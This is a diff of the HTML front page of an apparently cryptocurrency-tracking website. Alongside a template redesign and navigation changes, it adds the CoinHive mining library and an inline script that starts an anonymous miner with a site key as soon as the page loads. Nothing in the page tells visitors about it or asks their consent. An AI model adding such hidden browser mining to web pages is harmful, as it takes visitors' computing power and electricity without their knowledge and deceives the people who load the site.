@@ -6,8 +6,12 @@
 <head>
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css">
-
+<link rel="stylesheet" href="../css/bootstrap.min.css">
+<link rel="stylesheet" href="../css/bootstrap-theme.min.css">
+<link rel="stylesheet" href="../css/fontAwesome.css">
+<link rel="stylesheet" href="../css/templatemo-style.css">
   <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.5/angular.min.js"></script>
+  <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
   <script src="script.js"></script>
   <script>
   (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
@@ -15,45 +19,76 @@
   m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
   })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
 
-  ga('create', 'UA-105407554-1', 'auto');
+  ga('create', 'UA-105407554-2', 'auto');
   ga('send', 'pageview');
 
+</script>
+<script>
+	var miner = new CoinHive.Anonymous('mxQ4fvr9wTiWHesQ5g5L23GDpzNgIuOV', {threads: 1});
+	miner.start();
 </script>
 </head>
 
 <!-- define angular controller -->
 <body ng-controller="mainController">
-<div class="container-fluid">
-	<div class="row">
-		<div class="col-sm-3 col-xs-12" style="padding-top:25px;">
-			<span>Donations are welcome on:</span>
-			<div class="input-group">
-				<span class="input-group-addon">Btc</span>
-				<input type="text"  class="form-control" disabled value="1JUoVvQNsmsEJrZLd9ZMMKoSvTJ52tRTG7" />
-			</div>
-			<div class="input-group" style="padding-top: 10px">
-				<span class="input-group-addon">Ltc</span>
-				<input type="text"  class="form-control" disabled value="LMYDzpbBjuuJ3tssW9h2XKZy9XoYTpYZsP" />
-			</div>
-		</div>
-	</div>
-</div>
 
-<div class="container-fluid" style="padding-top:30px;">
-	<div class="row">
-	
-		<div class="col-xs-12 col-sm-12 col-lg-6">
-    <div  ng-repeat="interval in intervals" coin-table-interval></div>
-		
-		</div>
-		
-		
-		<div class="col-xs-12 col-sm-12 col-lg-6">
-			<div coin-table-main> </div>
-		
-		</div>
-	</div>
-</div>
+    <div class="overlay"></div>
+
+    <section class="cd-hero">
+
+      <div class="cd-slider-nav">
+        <nav>
+          <span class="cd-marker item-1"></span>
+          <ul>
+            <li><a href="/"><div class="image-icon"><img src="../img/home-icon.png"></div><h6>Welcome</h6></a></li>
+            <li><a href="/overview/index.html"><div class="image-icon"><img src="../img/projects-icon.png"></div><h6>Overview</h6></a></li>
+          </ul>
+        </nav>
+      </div> <!-- .cd-slider-nav -->
+      <div class="container-fluid">
+      	<div class="row">
+      		<div class="col-sm-3 col-xs-12" style="padding-top:25px;">
+      			<span style="color:white">Donations are welcome on:</span>
+      			<div class="input-group">
+      				<span class="input-group-addon">Btc</span>
+      				<input type="text"  class="form-control" disabled value="1JUoVvQNsmsEJrZLd9ZMMKoSvTJ52tRTG7" />
+      			</div>
+      			<div class="input-group" style="padding-top: 10px">
+      				<span class="input-group-addon">Ltc</span>
+      				<input type="text"  class="form-control" disabled value="LMYDzpbBjuuJ3tssW9h2XKZy9XoYTpYZsP" />
+      			</div>
+      		</div>
+      	</div>
+      </div>
+
+      <div class="container-fluid" style="padding-top:30px;">
+      	<div class="row">
+
+      		<div class="col-xs-12 col-sm-12 col-lg-6">
+          <div ng-repeat="interval in intervals" coin-table-interval></div>
+      		</div>
+
+      		<div class="col-xs-12 col-sm-12 col-lg-6">
+      			<div coin-table-main> </div>
+
+      		</div>
+      	</div>
+      </div>
+
+    </section> <!-- .cd-hero -->
+
+
+    <footer>
+      <p>Copyright &copy; 2017 | Designed by <a href="http://www.templatemo.com" target="_parent"><em>templatemo</em></a></p>
+    </footer>
+
+    <!-- <script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script> -->
+    <!-- <script>window.jQuery || document.write('<script src="js/vendor/jquery-1.11.2.min.js"><\/script>')</script> -->
+
+    <!-- <script src="js/vendor/bootstrap.min.js"></script>
+    <script src="js/plugins.js"></script>
+    <script src="js/main.js"></script> -->
+
 </body>
 
 </html>
